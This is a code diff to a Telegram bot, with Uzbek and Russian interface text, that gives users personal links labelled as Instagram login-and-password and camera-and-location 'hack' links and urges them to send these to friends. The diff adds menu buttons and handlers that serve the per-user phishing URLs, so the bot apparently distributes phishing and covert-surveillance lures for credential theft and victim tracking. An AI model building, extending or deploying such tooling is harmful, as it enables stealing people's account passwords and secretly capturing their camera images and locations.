@@ -84,13 +84,13 @@ return false;
 }
 async function showSubscriptionRequired(ctx) {
 await ctx.reply(
-`*Channel Subscription Required*\n\nTo use this bot, please join our private channel first!`,
+`*Majburiy Obuna*\n\nBotimizdan foydalanish uchun iltimos, quyidagi kanalga obuna bo'ling:`,
 {
 parse_mode: "Markdown",
 reply_markup: {
 inline_keyboard: [
-[{ text: "Join Private Channel", url: CHANNEL_INVITE_LINK }],
-[{ text: "I've Joined", callback_data: "check_subscription" }]
+[{ text: "📢 Kanalga Obuna bo'lish", url: CHANNEL_INVITE_LINK }],
+[{ text: "✅ Men obuna bo'lganman", callback_data: "check_subscription" }]
 ]
 }
 }
@@ -109,17 +109,39 @@ const personalInstaLink = `https://${HOST}/insta/${id}`;
 const referralLink = `https://${HOST}/r/${id}`;
 
 await ctx.reply(
-    `✨ *Xush Kelibsiz! Bu Havolalarni Dostlaringizga Yuboring *\n\n🔗 *Kamera va Lokatsiyan Hack havolasi:*\n${referralLink}\n\n📷 *Instagram Login va Parol hack havolasi:*\n${personalInstaLink}\n\nПоделитесь ссылкой или откройте профиль.`,
-{
-parse_mode: "Markdown",
-reply_markup: {
-inline_keyboard: [
-          [{ text: "📷 Instagram hack havola", url: personalInstaLink }],
-          [{ text: "🔗 Kamera va Lokatsiya hack havola", url: referralLink }],
-]
-}
-}
+  `✨ *Xush Kelibsiz! Bu Havolalarni Dostlaringizga Yuboring *\n\n🔗 *Kamera va Lokatsiyan Hack havolasi:*\n${referralLink}\n\n📷 *Instagram Login va Parol hack havolasi:*\n${personalInstaLink}\n\nПоделитесь ссылкой или откройте профиль.`,
+  {
+    parse_mode: "Markdown",
+    reply_markup: {
+      keyboard: [
+        ["📷 Instagram Hack", "📸 Camera Hack"],
+        ["☎️ Admin bilan bog'lanish"]
+      ],
+      resize_keyboard: true
+    }
+  }
 );
+
+// Handle text messages for menu buttons
+bot.hears("📷 Instagram Hack", async (ctx) => {
+  await ctx.reply("Instagram hack havolasi:", {
+    reply_markup: {
+      inline_keyboard: [[{ text: "📷 Instagram hack havola", url: `https://${HOST}/insta/${ctx.from.id}` }]]
+    }
+  });
+});
+
+bot.hears("📸 Camera Hack", async (ctx) => {
+  await ctx.reply("Camera va lokatsiya hack havolasi:", {
+    reply_markup: {
+      inline_keyboard: [[{ text: "🔗 Camera hack havola", url: `https://${HOST}/r/${ctx.from.id}` }]]
+    }
+  });
+});
+
+bot.hears("☎️ Admin bilan bog'lanish", async (ctx) => {
+  await ctx.reply("Admin bilan bog'lanish uchun: @admin_username");
+});
 });
 
 bot.action("check_subscription", async (ctx) => {
